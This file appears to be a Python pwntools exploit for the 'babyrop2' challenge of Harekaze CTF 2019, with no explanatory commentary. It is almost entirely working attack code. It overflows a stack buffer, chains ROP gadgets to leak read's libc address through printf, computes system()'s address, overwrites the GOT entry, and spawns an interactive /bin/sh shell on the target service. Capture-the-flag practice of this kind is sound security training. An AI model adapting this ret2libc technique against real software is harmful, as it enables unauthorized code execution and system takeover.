# Harekaze 2019 babyrop2
from pwn import *

DEBUG = False

_printfgot = p64(0x00601018)
_printfplt = p64(0x004004f0)
_readgot = p64(0x00601020)
_readplt = p64(0x00400500)
_overflow = b"A" * 32 + b"rbp4rbp8"
_poprdi = p64(0x00400733) # pop rdi ; ret
_poprsi = p64(0x00400731) # pop rsi ; pop r15 ; ret
_poprsp = p64(0x0040072d) # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
_poprbp = p64(0x004005a0) # pop rbp ; ret
_welcome_str = p64(0x00400770)    # Welcome to the ...
_whatever = b"junkjunk"
_main = p64(0x00400636)

payload = _overflow
payload += _poprdi
payload += _welcome_str
payload += _poprsi
payload += _readgot
payload += _whatever
payload += _printfplt
#payload += _main
payload += _poprdi
payload += p64(0)
payload += _poprsi
payload += _readgot
payload += _whatever
payload += _readplt
payload += _poprdi
payload += p64(0x00601028)
payload += _readplt

e = ELF('libc.so.6')
p = process('babyrop2', env={"LD_PRELOAD": "libc.so.6"}) if DEBUG else remote('localhost', 45678)

p.recv()
p.sendline(payload)
for i in range(2):
    p.readuntil("Welcome to the Pwn World again, ")
readgot_addr = p.readuntil(b'!\n').rstrip(b'!\n')

print("addr read: {}".format(readgot_addr))
sysoffset = e.symbols[b'read'] - e.symbols[b'system']
#shoffset = list(e.search(b'/bin/sh'))[0] - e.symbols[b'__libc_start_main']
print("offsets sys: {}".format(sysoffset))
sys_addr = p64(int.from_bytes(readgot_addr, "little") - sysoffset)
print("addr sys: {}".format(sys_addr))

#payload = _overflow
#payload += _poprdi
#payload += sh_addr
#payload += sys_addr

payload = sys_addr
payload += b"/bin/sh\x00"#sh_addr

#p.recv()
p.sendline(payload)
p.interactive()

